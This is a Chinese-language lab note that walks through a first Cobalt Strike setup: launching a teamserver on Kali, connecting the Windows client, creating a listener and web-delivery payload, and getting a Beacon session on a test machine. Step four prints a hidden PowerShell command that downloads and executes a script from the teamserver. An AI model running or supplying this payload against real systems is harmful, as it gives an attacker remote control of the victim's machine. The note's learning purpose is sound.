ailx10说：这篇是2022年1月之前写的，后来又改过。第一次认真搭 Cobalt Strike，我先在 Kali 开团队服务端，再用 Windows 客户端建监听、生成投递命令，让实验目标运行，看到 Beacon 后试 whoami。只做了一个最小闭环，界面里很多菜单还没展开，但团队端、监听器和目标会话已经能对应起来。笔记把这段顺序留着，方便以后不靠印象点按钮。它不是凭空入侵一台机器的全过程，目标执行这步本来就由我准备；知道每个角色是什么，再往后探索功能时才不容易把框架、载荷和权限混成一个词。

---

CS入门Kali teamserver、Windows客户端建listener，Web投递PowerShell下载命令在实验目标运行，Beacon上线后whoami。

核查提示：CS不是单纯Armitage升级或MSF图形版；载荷执行前提必须明确，external/internal是工具观察不总对应公网内网，星号非独立权限检验。 原环境及图内细节尚未逐项核验。

本文以历史测试环境介绍 Cobalt Strike 的 teamserver、监听器和 Beacon。目标端需要实际执行载荷后才可能建立会话；这并不自动证明获得更高权限。

![](/notes-assets/40e28ee59f41abeb9b44.jpg)

## 第一步：在kali rolling上启动Teamserver

- 第一个参数是Teamserver所在的IP地址
- 第二个参数是密码，客户端需要输入这个密码

```
./teamserver 192.168.160.140 ailx10
```

![](/notes-assets/12eabbcf4f792fd4266c.jpg)

## 第二步：在windows10上启动cobalt strike

- 主机填写服务端的IP地址
- 端口默认不用改
- 用户名随便
- 密码填写服务端设置的密码

![](/notes-assets/4260a6c5c8c6eb7dbba5.jpg)

## 第四步：制作攻击载荷

- 进入投递HTTP WebShell载荷模块

![](/notes-assets/f2b90571759d2c645397.jpg)

- 默认参数，不需要修改

![](/notes-assets/4fd3198dd561c84106c4.webp)

- 拷贝攻击载荷

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.160.140:80/a'))"
```

![](/notes-assets/72f358306d7e47ba89e8.webp)

## 第六步：肉鸡上线（抓鸡成功）

- external：外网IP地址
- internal：内网IP地址
- user：用户（`*`说明是管理员）
- computer：计算机名称
